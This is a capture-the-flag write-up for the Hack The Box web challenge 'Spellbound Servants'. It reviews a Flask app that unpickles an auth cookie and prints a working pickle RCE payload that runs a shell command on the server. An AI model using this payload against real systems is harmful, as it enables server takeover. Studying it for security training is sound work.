---
title: Spellbound Servants - Hack The Box
date: 2025-01-01
---

<script setup>
    import ChallengeCard from "../../../../../.vitepress/components/ChallengeCard.vue";
</script>

# Spellbound Servants

## Challenge Description

Innocent souls, ensnared by malevolent enchantments, are tragically being auctioned as subservient beings on a sinister
website. Our mission is to infiltrate this digital realm, unravel the dark spells that bind them, and set the captives
free.

## Challenge Overview

The challenge involves a web application called **Spellbound Servants**, a themed website that provides a user interface
for "halloween servants" products. The application requires users to log in and uses cookies to authenticate them. Upon
inspecting the application's functionality, a vulnerability was discovered that allows for remote code execution (RCE).
This vulnerability lies in the insecure deserialization of user-provided data in the `auth` cookie.

## Code Review

The application's backend code includes the following critical components:

1. **Authentication Mechanism**:
   ```python
   def isAuthenticated(f):
       @wraps(f)
       def decorator(*args, **kwargs):
           token = request.cookies.get('auth', False)

           if not token:
               return abort(401, 'Unauthorised access detected!')
           
           try:
               user = pickle.loads(base64.urlsafe_b64decode(token))
               kwargs['user'] = user
               return f(*args, **kwargs)
           except:
               return abort(401, 'Unauthorised access detected!')

       return decorator
   ```
    - The `auth` cookie is base64-decoded and deserialized using `pickle.loads`.
    - This approach is inherently insecure as it trusts the user-provided `auth` token without validation.

2. **Login Process**:
   ```python
   @api.route('/login', methods=['POST'])
   def api_login():
       if not request.is_json:
           return response('Invalid JSON!'), 400

       data = request.get_json()
       username = data.get('username', '')
       password = data.get('password', '')

       if not username or not password:
           return response('All fields are required!'), 401

       user = login_user_db(username, password)

       if user:
           res = make_response(response('Logged In successfully'))
           res.set_cookie('auth', user)
           return res
       
       return response('Invalid credentials!'), 403
   ```
    - The user data is stored as a serialized `pickle` object in the `auth` cookie.

### Vulnerability

The use of `pickle.loads` to deserialize the cookie data introduces a **remote code execution (RCE)** vulnerability.
Since `pickle` can execute arbitrary code during deserialization, a malicious actor can craft a payload that executes
commands on the server.

## Exploitation

To exploit this vulnerability, the following steps were taken:

### 1. Crafting the Malicious Payload

A Python script was used to generate a malicious `pickle` payload that executes a command to copy the flag file to a
publicly accessible directory.

```python
import base64
import pickle

class RCE:
    def __reduce__(self):
        return exec, ('import os; os.system("cat /flag.txt > /app/application/static/flag.txt")',)

malicious_pickle = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode()
print(malicious_pickle)
```

This payload:

- Defines a class `RCE` with a `__reduce__` method that executes the command to copy the flag.
- Serializes the `RCE` object using `pickle` and encodes it in base64.

### 2. Setting the Malicious Cookie

The generated payload is set as the `auth` cookie in the browser. Using the developer tools, the cookie is modified to
contain the malicious `pickle` payload.

### 3. Triggering the Exploit

The application processes the `auth` cookie when accessing authenticated endpoints, such as `/home`. Upon visiting this
endpoint with the malicious cookie, the command is executed on the server.

### 4. Receiving the Flag

The flag is copied to the publicly accessible directory, allowing it to be retrieved by accessing the corresponding URL.

![Spellbound Servants - Flag](/ctf/hack-the-box/challenges/web/spellbound-servants/flag.png){style="display: block; margin: auto;"}

We successfully exploited the deserialization vulnerability to execute arbitrary commands on the server and retrieve the
flag. :tada:

<ChallengeCard
    challengeType="web"
    challengeName="Spellbound Servants"
    htbCardLink="https://www.hackthebox.com/achievement/challenge/585215/626"
/>

## References

- [Python `pickle` Documentation](https://docs.python.org/3/library/pickle.html)
